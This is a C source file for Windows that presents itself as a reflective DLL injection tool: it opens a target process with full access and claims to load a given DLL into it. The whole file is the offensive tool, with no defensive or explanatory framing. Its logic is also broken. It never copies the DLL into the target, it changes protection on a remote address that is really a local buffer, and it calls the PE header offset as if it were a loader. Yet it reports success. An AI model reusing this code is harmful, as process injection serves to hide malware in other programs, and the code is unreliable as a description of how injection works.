#include <windows.h>
#include <stdio.h>

// Reflective loader code
typedef VOID(*pReflectiveLoader)(VOID);
extern pReflectiveLoader ReflectiveLoader;

// Function to map a DLL into memory
LPVOID MapDllIntoMemory(const char* dllPath) {
    HANDLE hFile = CreateFileA(dllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Failed to open DLL file\n");
        return NULL;
    }

    DWORD dwFileSize = GetFileSize(hFile, NULL);
    if (dwFileSize == INVALID_FILE_SIZE) {
        CloseHandle(hFile);
        printf("Failed to get file size\n");
        return NULL;
    }

    LPVOID lpFileBuffer = VirtualAlloc(NULL, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (lpFileBuffer == NULL) {
        CloseHandle(hFile);
        printf("Failed to allocate memory for file buffer\n");
        return NULL;
    }

    DWORD dwBytesRead;
    if (!ReadFile(hFile, lpFileBuffer, dwFileSize, &dwBytesRead, NULL)) {
        CloseHandle(hFile);
        VirtualFree(lpFileBuffer, 0, MEM_RELEASE);
        printf("Failed to read DLL file\n");
        return NULL;
    }

    CloseHandle(hFile);
    return lpFileBuffer;
}

// Function to inject the DLL using reflective loader
BOOL ReflectiveDllInjection(HANDLE hProcess, LPVOID lpDllBuffer) {
    DWORD dwOldProtect;
    if (!VirtualProtectEx(hProcess, lpDllBuffer, 0x1000, PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
        printf("Failed to change memory protection\n");
        return FALSE;
    }

    pReflectiveLoader loader = (pReflectiveLoader)((BYTE*)lpDllBuffer + ((PIMAGE_DOS_HEADER)lpDllBuffer)->e_lfanew);
    loader();

    return TRUE;
}

int main(int argc, char** argv) {
    if (argc != 3) {
        printf("Usage: %s <process id> <dll path>\n", argv[0]);
        return 1;
    }

    DWORD processId = atoi(argv[1]);
    const char* dllPath = argv[2];

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (hProcess == NULL) {
        printf("Failed to open process\n");
        return 1;
    }

    LPVOID lpDllBuffer = MapDllIntoMemory(dllPath);
    if (lpDllBuffer == NULL) {
        CloseHandle(hProcess);
        return 1;
    }

    if (!ReflectiveDllInjection(hProcess, lpDllBuffer)) {
        CloseHandle(hProcess);
        VirtualFree(lpDllBuffer, 0, MEM_RELEASE);
        return 1;
    }

    VirtualFree(lpDllBuffer, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    printf("DLL injected successfully\n");

    return 0;
}
